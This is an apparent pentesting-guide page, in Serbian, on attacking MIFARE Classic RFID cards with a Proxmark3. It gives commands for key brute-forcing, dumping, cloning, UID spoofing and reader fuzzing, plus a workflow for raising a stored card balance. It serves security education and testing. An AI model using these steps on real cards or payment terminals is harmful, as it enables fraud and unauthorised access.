# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Napadanje RFID sistema pomoću Proxmark3

Prvo morate imati [**Proxmark3**](https://proxmark.com) i [**instalirati software i njegove zavisnosti**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Napadanje MIFARE Classic 1KB

Ima **16 sektora**, svaki od njih ima **4 bloka**, a svaki blok sadrži **16B**. UID se nalazi u sektoru 0, bloku 0 (i ne može se menjati).\
Za pristup svakom sektoru potrebna su vam **2 ključa** (**A** i **B**), koji su sačuvani u **bloku 3 svakog sektora** (sector trailer). Sector trailer takođe čuva **access bits** koji pomoću 2 ključa određuju dozvole za **čitanje i pisanje** u **svakom bloku**.\
2 ključa su korisna za davanje dozvola za čitanje ako znate prvi ključ i pisanje ako znate drugi ključ (na primer).

Može se izvesti nekoliko napada
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 omogućava i druge radnje, kao što je **prisluškivanje** komunikacije između **Tag-a i čitača**, kako bi se pokušalo doći do osetljivih podataka. Na ovoj kartici mogli biste samo da sniff-ujete komunikaciju i izračunate korišćeni ključ, jer su **korišćene kriptografske operacije slabe**, a poznavanjem otvorenog i šifrovanog teksta možete da ga izračunate (alatka `mfkey64`).<sup>[[3]](#references)</sup>

#### MiFare Classic brzi tok rada za zloupotrebu sačuvane vrednosti

Kada terminali čuvaju stanje na Classic karticama, tipičan end-to-end tok je:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Napomene

- `hf mf autopwn` orkestrira napade u stilu nested/darkside/HardNested, oporavlja ključeve i kreira dumpove u klijentskom dumps folderu.<sup>[[1]](#references)</sup>
- Upisivanje bloka 0/UID-a funkcioniše samo na magic gen1a/gen2 karticama. Standardne Classic kartice imaju UID samo za čitanje.<sup>[[2]](#references)</sup>
- Mnoge implementacije koriste Classic "value blocks" ili jednostavne kontrolne sume. Uverite se da su sva duplicirana/komplementirana polja i kontrolne sume konzistentne nakon izmene.<sup>[[4]](#references)</sup>

Pogledajte metodologiju višeg nivoa i mere za ublažavanje rizika na:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U tom slučaju možete koristiti Proxmark3 za slanje prilagođenih **raw komandi tagovima**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Pomoću ovih informacija možete pokušati da pronađete informacije o kartici i načinu komunikacije sa njom. Proxmark3 omogućava slanje raw komandi kao što je: `hf 14a raw -p -b 7 26`

### Skripte

Proxmark3 softver dolazi sa unapred učitanom listom **skripti za automatizaciju** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili kompletnu listu, koristite komandu `script list`. Zatim koristite komandu `script run`, nakon koje sledi naziv skripte:
```
proxmark3> script run mfkeys
```
Možete napraviti skriptu za **fuzz čitača tagova**, tako što, nakon kopiranja podataka sa **važeće kartice**, jednostavno napišete **Lua skriptu** koja **nasumično menja** jedan ili više nasumičnih **bajtova** i proverava da li se **čitač ruši** pri nekoj iteraciji.

## Reference

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP izjava o MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Eksploatacija ranjivosti NFC kartice u KioSoft Stored Value sistemu (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
